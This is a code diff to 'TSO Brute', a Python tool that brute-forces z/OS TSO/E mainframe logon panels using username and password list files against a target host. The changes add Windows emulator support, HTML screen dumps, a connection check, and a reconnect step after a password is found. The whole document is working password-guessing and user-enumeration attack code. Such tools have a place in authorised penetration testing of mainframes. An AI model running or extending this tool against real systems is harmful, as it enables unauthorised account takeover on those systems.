@@ -34,7 +34,10 @@ elif platform.system() == 'Linux':
 	class Emulator(EmulatorBase):
 		x3270_executable = '/usr/bin/x3270' #uncomment this line if you do not wish to use x3270 on Linux
 		s3270_executable = '/usr/bin/s3270' #this assumes s3270 is in your $PATH. If not then you'll have to change it
-
+elif platform.system() == 'Windows':
+	class Emulator(EmulatorBase):
+		#x3270_executable = 'Windows_Binaries/wc3270.exe'
+		s3270_executable = 'Windows_Binaries/ws3270.exe'
 else:
 	print '[!]--------------- Your Platform:', platform.system(), 'is not supported at this time. Windows support should be available soon'
 	sys.exit()
@@ -44,13 +47,19 @@ def Get_TSO_PANEL():
 	##### CHANGE THE SECTION BELOW FOR YOUR CUSTOM ENVIRONMENT
 	##### THE POINT IS TO GET TO THE TSO LOGIN SCREEN WITH AN INVALID USER ID
 	#################################
-	
-	em.fill_field(21, 22, 'tso', 8) #Sends 'tso' to the screen to launch TSO. The first and second number are where the cursor goes, the 'tso' is the text to send 
+	em.wait_for_field()
+	em.exec_command('PrintText(html,screen_tso.html)')
+	em.send_string('tso') #Sends 'tso' to the screen to launch TSO. The first and second number are where the cursor goes, the 'tso' is the text to send 
+	em.exec_command('PrintText(html,screen_tso.html)')
 	em.send_enter() #presses 'enter' on the keyboard
+	em.exec_command('PrintText(html,screen_tso.html)')
 	time.sleep(results.sleep) #sleeps, because generally mainframes take a while to process these things
-	em.wait_for_field() #waits for the keyboard to become unlocked
-	em.fill_field(2, 1, 'TSOFAKE', 8) #This is the user ID we pass to TSO the first time you logon. You can change this to whatever you like, but it must be less than 7 characters long and it MUST be an invalid TSO user. 
+	em.exec_command('PrintText(html,screen_tso.html)')
+	print 'sending TSOFAKE'
+	em.send_string('TSOFAKE') #This is the user ID we pass to TSO the first time you logon. You can change this to whatever you like, but it must be less than 7 characters long and it MUST be an invalid TSO user. 
+	em.exec_command('PrintText(html,screen_tso.html)')
 	em.send_enter() 
+
 	
 	#################################
 	##### AT THIS POINT WE'RE AT THE LOGON PROMPT
@@ -88,7 +97,7 @@ print '''
 
 '''
 #start argument parser
-parser = argparse.ArgumentParser(description='TSO Brute - The z/OS TSO/E logon panel brute forcer.',epilog='Eh TSO Brutus?')
+parser = argparse.ArgumentParser(description='TSO Brute - The z/OS TSO/E logon panel brute forcer.',epilog='Get to it!')
 parser.add_argument('-t','--target', help='target IP address or Hostname and port: TARGET[:PORT] default port is 23', required=True,dest='target')
 parser.add_argument('-s','--sleep',help='Seconds to sleep between actions (increase on slower systems). The default is 1 second.',default=1,type=int,dest='sleep')
 parser.add_argument('-u','--userfile',help='File containing list of usernames', required=True,dest='userfile')
@@ -108,21 +117,26 @@ userfile=open(results.userfile) #open the usernames file
 if not results.enumeration: print '[+]--------------- Password Listing    =', results.passfile
 print '[+]--------------- Wait in Seconds     =', results.sleep
 print '[+]--------------- Attack platform     =', platform.system() 
-
+print '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
 
 if not results.passfile and not results.enumeration: #A pssword file is required if we're not in enumeration mode
 	sys.exit("[!]--------------- Not in Enumeration mode (-e). Password file (-p) required! Aborting")
 
-if results.movie_mode:
+if results.movie_mode and not platform.system() == 'Windows':
         if not results.quiet: print '[+]--------------- ULTRA AWESOME Hacker Movie Mode: ENABLED!!'
 	em = Emulator(visible=True) #Enables Movie Mode which uses x3270 so it looks all movie like 'n shit
 else:
-		#or not (uses s3270)
-	if not results.quiet: print '[+]--------------- ULTRA AWESOME Hacker Movie Mode: Disabled :('	
+	if not results.quiet: 
+		print '[+]--------------- ULTRA AWESOME Hacker Movie Mode', 	
+		if results.movie_mode and platform.system() == 'Windows': print 'not supported on Windows',
+		print ': Disabled :('
 	em = Emulator()
 if results.quiet: print '[+]--------------- Quiet Mode Enabled: Shhhhhhhhh!'
 print '[+]--------------- Connecting to ', results.target
 connect = Connect_to_ZOS()
+if not em.is_connected():
+	print '[!]--------------- Could not connect to ', results.target, 'aborting'
+	sys.exit()
 print '[+]--------------- Getting to TSO/E Logon Panel'
 connect = Get_TSO_PANEL()
 print '                  |- At TSO/E Logon Panel'
@@ -173,12 +187,8 @@ for username in userfile:
 						else:
 							print '                    ->', password.strip(),'-- [*] Password Found!!'
 							#once a password is found we have to close the connection and reconnect
-							em.terminate()
-							if results.movie_mode:
-								em = Emulator(visible=True) #Enables Movie Mode which uses x3270 so it looks all movie like 'n shit
-							else:
-								em = Emulator()
-							connect = Connect_to_ZOS()
+							em.reconnect()
+							time.sleep(results.sleep)
 							valid_password = True
 							break
 				passfile.close()
